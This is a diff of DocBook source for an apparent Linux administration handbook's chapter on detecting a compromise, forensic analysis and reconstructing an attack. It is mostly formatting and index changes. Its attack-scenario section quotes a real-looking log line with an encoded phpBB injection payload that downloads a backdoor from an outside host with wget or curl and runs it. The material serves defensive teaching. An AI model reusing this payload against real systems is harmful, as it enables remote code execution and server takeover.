@@ -2794,6 +2794,7 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
     security policy, an administrator eventually faces an act of hijacking.
     This section provides a few guidelines on how to react when confronted
     with these unfortunate circumstances.</para>
+
     <section>
       <title>Detecting and Seeing the Cracker's Intrusion</title>
 
@@ -2814,10 +2815,12 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
       <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see
       what program this process is currently running:</para>
 
+      <indexterm><primary><filename>/proc</filename></primary><secondary><filename>/proc/<replaceable>pid</replaceable>/exe</filename></secondary></indexterm>
+
       <screen>
-<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>
-<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>
-      </screen>
+<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe
+</userinput><computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc
+</computeroutput></screen>
 
       <para>A program installed under <filename>/var/tmp/</filename> and
       running as the web server? No doubt left, the machine is
@@ -2825,25 +2828,26 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 
       <para>This is only one example, but many other hints can ring the
       administrator's bell:</para>
+
       <itemizedlist>
         <listitem>
-	  <para>an option to a command that no longer works; the version of
-	  the software that the command claims to be doesn't match the
-	  version that is supposed to be installed according to
-	  <command>dpkg</command>;</para>
+          <para>an option to a command that no longer works; the version of
+          the software that the command claims to be doesn't match the
+          version that is supposed to be installed according to
+          <command>dpkg</command>;</para>
         </listitem>
         <listitem>
-	  <para>a command prompt or a session greeting indicating that the
-	  last connection came from an unknown server on another
-	  continent;</para>
+          <para>a command prompt or a session greeting indicating that the
+          last connection came from an unknown server on another
+          continent;</para>
         </listitem>
         <listitem>
-	  <para>errors caused by the <filename>/tmp/</filename> partition
-	  being full, which turned out to be full of illegal copies of
-	  movies;</para>
+          <para>errors caused by the <filename>/tmp/</filename> partition
+          being full, which turned out to be full of illegal copies of
+          movies;</para>
         </listitem>
         <listitem>
-	  <para>and so on.</para>
+          <para>and so on.</para>
         </listitem>
       </itemizedlist>
     </section>
@@ -2892,19 +2896,19 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
       <sidebar>
         <title><emphasis>CAUTION</emphasis> Hot analysis</title>
 
-	<para>While it may seem tempting to analyze the system as it runs,
-	especially when the server is not physically reachable, this is
-	best avoided: quite simply you can't trust the programs currently
-	installed on the compromised system. It is quite possible for a
-	subverted <command>ps</command> command to hide some processes, or
-	for a subverted <command>ls</command> to hide files; sometimes even
-	the kernel is compromised!</para>
+        <para>While it may seem tempting to analyze the system as it runs,
+        especially when the server is not physically reachable, this is
+        best avoided: quite simply you can't trust the programs currently
+        installed on the compromised system. It is quite possible for a
+        subverted <command>ps</command> command to hide some processes, or
+        for a subverted <command>ls</command> to hide files; sometimes even
+        the kernel is compromised!</para>
 
-	<para>If such a hot analysis is still required, care should be
-	taken to only use known-good programs. A good way to do that would
-	be to have a rescue CD with pristine programs, or a read-only
-	network share. However, even those countermeasures may not be
-	enough if the kernel itself is compromised.</para>
+        <para>If such a hot analysis is still required, care should be
+        taken to only use known-good programs. A good way to do that would
+        be to have a rescue CD with pristine programs, or a read-only
+        network share. However, even those countermeasures may not be
+        enough if the kernel itself is compromised.</para>
       </sidebar>
 
       <para>Once the “dynamic” elements have been saved, the next step
@@ -2936,10 +2940,11 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 
       <para>Reinstalling a remote server is not always easy; it may involve
       assistance from the hosting company, because not all such companies
-      provide automated reinstallation systems. Care should be taken not to
-      reinstall the machine from backups taken later than the compromise.
-      Ideally, only data should be restored, the actual software should be
-      reinstalled from the installation media.</para>
+      provide automated reinstallation systems or remote consoles (although
+      these cases should be rare). Care should be taken not to reinstall the
+      machine from backups taken later than the compromise. Ideally, only data
+      should be restored, the actual software should be reinstalled from the
+      installation media.</para>
     </section>
     <section id="sect.forensic-analysis">
       <title>Forensic Analysis</title>
@@ -2953,47 +2958,53 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 
       <para>Retracing an attack scenario usually involves looking for
       everything that was modified and executed:</para>
+
       <itemizedlist>
         <listitem>
-	  <para><filename>.bash_history</filename> files often provide for
-	  a very interesting read;</para>
+          <para><filename>.bash_history</filename> files often provide for
+          a very interesting read;</para>
         </listitem>
         <listitem>
-	  <para>so does listing files that were recently created, modified
-	  or accessed;</para>
+          <para>so does listing files that were recently created, modified
+          or accessed;</para>
         </listitem>
         <listitem>
-	  <para>the <command>strings</command> command helps identifying
-	  programs installed by the attacker, by extracting text strings
-	  from a binary;</para>
+          <para>the <command>strings</command> command helps identifying
+          programs installed by the attacker, by extracting text strings
+          from a binary;</para>
         </listitem>
         <listitem>
-	  <para>the log files in <filename>/var/log/</filename> often allow
-	  reconstructing a chronology of events;</para>
+          <para>the log files in <filename>/var/log/</filename> often allow
+          reconstructing a chronology of events;</para>
         </listitem>
         <listitem>
-	  <para>special-purpose tools also allow restoring the contents of
-	  potentially deleted files, including log files that attackers
-	  often delete.</para>
+          <para>special-purpose tools also allow restoring the contents of
+          potentially deleted files, including log files that attackers
+          often delete.</para>
         </listitem>
       </itemizedlist>
 
-      <para>
-        Some of these operations can be made easier with specialized
-        software. In particular, the <emphasis role="pkg">sleuthkit</emphasis>
-        package provides many tools to analyze a filesystem. Their use is
-        made easier by the <emphasis>Autopsy Forensic Browser</emphasis>
-        graphical interface (in the <emphasis role="pkg">autopsy</emphasis>
-        package). Some Linux distributions have a "live install" image and
-        contain many programs for forensic analysis, such as Kali Linux (see
-        <xref linkend="sect.kali"/>), with its <emphasis>forensic
-        mode</emphasis>, BlackArchLinux<footnote><para>
-        <ulink url="https://blackarch.org"/></para></footnote> and the
-        commercial Grml-Forensic, based on Grml (see
-        <xref linkend="sect.grml"/>).
+      <indexterm><primary><emphasis role="pkg">sleuthkit</emphasis></primary></indexterm>
+      <indexterm><primary><emphasis role="pkg">autopsy</emphasis></primary></indexterm>
+      <indexterm><primary><emphasis role="distribution">Kali</emphasis></primary></indexterm>
+      <indexterm><primary><emphasis role="distribution">Grml</emphasis></primary></indexterm>
+      <indexterm><primary><emphasis role="distribution">BlackArchLinux</emphasis></primary></indexterm>
+
+      <para>Some of these operations can be made easier with specialized
+      software. In particular, the <emphasis role="pkg">sleuthkit</emphasis>
+      package provides many tools to analyze a filesystem. Their use is made
+      easier by the <emphasis>Autopsy Forensic Browser</emphasis> graphical
+      interface (in the <emphasis role="pkg">autopsy</emphasis> package). Some
+      Linux distributions have a "live install" image and contain many programs
+      for forensic analysis, such as Kali Linux (see <xref
+      linkend="sect.kali"/>), with its <emphasis>forensic mode</emphasis>,
+      BlackArchLinux, and the commercial Grml-Forensic, based on Grml (see
+      <xref linkend="sect.grml"/>).
+
+      <ulink type="block" url="https://blackarch.org"/>
+      <ulink type="block" url="https://grml-forensic.org/"/>
       </para>
-      <indexterm><primary>Autopsy Forensic Browser</primary></indexterm>
-      <indexterm><primary>The Sleuth Kit</primary></indexterm>
+
     </section>
     <section id="sect.reconstituting-the-attack-scenario">
       <title>Reconstituting the Attack Scenario</title>
@@ -3011,11 +3022,10 @@ files_tmp_filetrans(myapp_t,myapp_tmp_t,file)
 www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&amp;highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
       </programlisting>
 
-      <para>
-        This example matches exploitation of an old security
-        vulnerability in phpBB.
-        <ulink type="block" url="http://secunia.com/advisories/13239/"/>
-        <ulink type="block" url="https://www.phpbb.com/phpBB/viewtopic.php?t=240636"/>
+      <para>This example matches exploitation of an old security vulnerability
+      in phpBB.
+
+      <ulink type="block" url="https://www.phpbb.com/phpBB/viewtopic.php?t=240636"/>
       </para>
 
       <para>Decoding this long URL leads to understanding that the attacker
